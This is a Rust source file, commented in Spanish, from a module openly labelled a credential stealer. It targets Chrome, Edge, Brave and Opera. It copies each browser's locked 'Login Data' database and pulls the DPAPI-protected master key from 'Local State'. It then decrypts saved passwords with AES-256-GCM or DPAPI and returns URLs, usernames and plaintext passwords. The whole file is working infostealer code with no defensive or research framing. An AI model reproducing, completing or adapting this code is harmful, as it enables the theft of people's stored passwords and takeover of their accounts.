// Stealer para browsers basados en Chromium (Chrome, Edge, Brave, Opera)
use crate::stealer::{Credential, StealerError, StealerResult};
use crate::stealer::common::{get_appdata_local, file_exists, base64_decode};
use std::path::PathBuf;
use rusqlite::Connection;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};

#[cfg(target_os = "windows")]
use winapi::um::dpapi::CryptUnprotectData;
#[cfg(target_os = "windows")]
use winapi::um::wincrypt::DATA_BLOB;

/// Roba credenciales de Google Chrome
pub fn steal_chrome() -> StealerResult<Vec<Credential>> {
    steal_chromium_browser("Chrome", r"Google\Chrome\User Data")
}

/// Roba credenciales de Microsoft Edge
pub fn steal_edge() -> StealerResult<Vec<Credential>> {
    steal_chromium_browser("Edge", r"Microsoft\Edge\User Data")
}

/// Roba credenciales de Brave Browser
pub fn steal_brave() -> StealerResult<Vec<Credential>> {
    steal_chromium_browser("Brave", r"BraveSoftware\Brave-Browser\User Data")
}

/// Roba credenciales de Opera
pub fn steal_opera() -> StealerResult<Vec<Credential>> {
    steal_chromium_browser("Opera", r"Opera Software\Opera Stable")
}

/// Función genérica para robar credenciales de cualquier browser Chromium
fn steal_chromium_browser(browser_name: &str, relative_path: &str) -> StealerResult<Vec<Credential>> {
    let appdata = get_appdata_local().ok_or(StealerError::BrowserNotFound)?;
    
    let browser_path = appdata.join(relative_path);
    if !browser_path.exists() {
        return Err(StealerError::BrowserNotFound);
    }

    // Ruta a Local State (para obtener la clave de encriptación)
    let local_state_path = browser_path.join("Local State");
    
    // Ruta a la base de datos de logins
    let login_data_path = browser_path.join(r"Default\Login Data");
    
    if !file_exists(&login_data_path) {
        return Err(StealerError::DatabaseError("Login Data no encontrado".into()));
    }

    // Leer y parsear Local State para obtener la master key
    let master_key = if file_exists(&local_state_path) {
        extract_master_key(&local_state_path)?
    } else {
        None
    };

    // Copiar Login Data a temp (está locked por el browser)
    let temp_db = copy_db_to_temp(&login_data_path)?;

    // Extraer credenciales de la base de datos SQLite
    let creds = extract_credentials_from_db(&temp_db, browser_name, master_key.as_deref())?;
    
    // Limpiar archivo temporal
    let _ = std::fs::remove_file(&temp_db);
    
    Ok(creds)
}

/// Copia la base de datos a un archivo temporal
fn copy_db_to_temp(db_path: &PathBuf) -> StealerResult<PathBuf> {
    let temp_dir = std::env::temp_dir();
    let temp_name = format!("tmp_{}.db", std::process::id());
    let temp_path = temp_dir.join(temp_name);
    
    std::fs::copy(db_path, &temp_path)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    Ok(temp_path)
}

/// Extrae la master key del archivo Local State
fn extract_master_key(local_state_path: &PathBuf) -> StealerResult<Option<Vec<u8>>> {
    // Leer el archivo JSON
    let content = std::fs::read_to_string(local_state_path)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    // Buscar la clave encriptada (búsqueda simple sin JSON parser)
    if let Some(start) = content.find("\"encrypted_key\":\"") {
        let start_idx = start + 17;
        if let Some(end) = content[start_idx..].find("\"") {
            let base64_key = &content[start_idx..start_idx + end];
            
            // Decodificar Base64
            let encrypted_key = base64_decode(base64_key)
                .map_err(|_| StealerError::Base64Error)?;
            
            // Los primeros 5 bytes son "DPAPI", los removemos
            if encrypted_key.len() > 5 && &encrypted_key[0..5] == b"DPAPI" {
                let encrypted_without_prefix = &encrypted_key[5..];
                
                // Desencriptar usando DPAPI (solo Windows)
                #[cfg(target_os = "windows")]
                {
                    let decrypted = dpapi_decrypt(encrypted_without_prefix)?;
                    return Ok(Some(decrypted));
                }
                
                #[cfg(not(target_os = "windows"))]
                return Err(StealerError::DecryptionFailed);
            }
        }
    }
    
    Ok(None)
}

/// Desencripta datos usando Windows DPAPI
#[cfg(target_os = "windows")]
fn dpapi_decrypt(data: &[u8]) -> StealerResult<Vec<u8>> {
    use std::ptr;
    
    let mut data_in = DATA_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };

    let mut data_out: DATA_BLOB = unsafe { std::mem::zeroed() };

    let result = unsafe {
        CryptUnprotectData(
            &mut data_in,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            &mut data_out,
        )
    };

    if result == 0 {
        return Err(StealerError::DecryptionFailed);
    }

    let size = data_out.cbData as usize;
    let decrypted = unsafe {
        std::slice::from_raw_parts(data_out.pbData, size).to_vec()
    };

    Ok(decrypted)
}

/// Extrae credenciales de la base de datos SQLite (Login Data)
fn extract_credentials_from_db(
    db_path: &PathBuf,
    browser_name: &str,
    master_key: Option<&[u8]>,
) -> StealerResult<Vec<Credential>> {
    let conn = Connection::open(db_path)
        .map_err(|e| StealerError::DatabaseError(e.to_string()))?;
    
    let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")
        .map_err(|e| StealerError::DatabaseError(e.to_string()))?;
    
    let rows = stmt.query_map([], |row| {
        Ok((
            row.get::<_, String>(0)?,
            row.get::<_, String>(1)?,
            row.get::<_, Vec<u8>>(2)?,
        ))
    }).map_err(|e| StealerError::DatabaseError(e.to_string()))?;
    
    let mut credentials = Vec::new();
    
    for row_result in rows {
        if let Ok((url, username, encrypted_pwd)) = row_result {
            if username.is_empty() || encrypted_pwd.is_empty() {
                continue;
            }
            
            // Intentar desencriptar el password
            let password = if let Some(key) = master_key {
                // Chromium moderno (v80+) usa AES-256-GCM
                decrypt_aes_gcm(&encrypted_pwd, key).unwrap_or_else(|_| {
                    // Fallback a DPAPI para passwords antiguos
                    decrypt_dpapi_fallback(&encrypted_pwd).unwrap_or_else(|_| "[decrypt failed]".to_string())
                })
            } else {
                // Sin master key, intentar DPAPI directo
                decrypt_dpapi_fallback(&encrypted_pwd).unwrap_or_else(|_| "[no master key]".to_string())
            };
            
            credentials.push(Credential {
                browser: browser_name.to_string(),
                url,
                username,
                password,
            });
        }
    }
    
    Ok(credentials)
}

/// Desencripta un password usando AES-256-GCM
fn decrypt_aes_gcm(encrypted_data: &[u8], master_key: &[u8]) -> StealerResult<String> {
    // Chromium v80+ formato: [v10/v11][12 bytes nonce][encrypted data][16 bytes tag]
    if encrypted_data.len() < 3 {
        return Err(StealerError::InvalidData);
    }
    
    // Verificar prefijo
    if &encrypted_data[0..3] != b"v10" && &encrypted_data[0..3] != b"v11" {
        return Err(StealerError::InvalidData);
    }
    
    if encrypted_data.len() < 3 + 12 + 16 {
        return Err(StealerError::InvalidData);
    }
    
    // Extraer componentes
    let nonce_bytes = &encrypted_data[3..15]; // 12 bytes
    let ciphertext_with_tag = &encrypted_data[15..]; // resto (encrypted + 16 bytes tag)
    
    // Crear cipher
    let cipher = Aes256Gcm::new_from_slice(master_key)
        .map_err(|_| StealerError::DecryptionFailed)?;
    
    let nonce = Nonce::from_slice(nonce_bytes);
    
    // Desencriptar
    let plaintext = cipher.decrypt(nonce, ciphertext_with_tag)
        .map_err(|_| StealerError::DecryptionFailed)?;
    
    String::from_utf8(plaintext)
        .map_err(|_| StealerError::InvalidData)
}

/// Fallback: Desencripta usando DPAPI directamente (passwords antiguos)
#[cfg(target_os = "windows")]
fn decrypt_dpapi_fallback(encrypted_data: &[u8]) -> StealerResult<String> {
    let decrypted = dpapi_decrypt(encrypted_data)?;
    String::from_utf8(decrypted)
        .map_err(|_| StealerError::InvalidData)
}

#[cfg(not(target_os = "windows"))]
fn decrypt_dpapi_fallback(_encrypted_data: &[u8]) -> StealerResult<String> {
    Err(StealerError::DecryptionFailed)
}
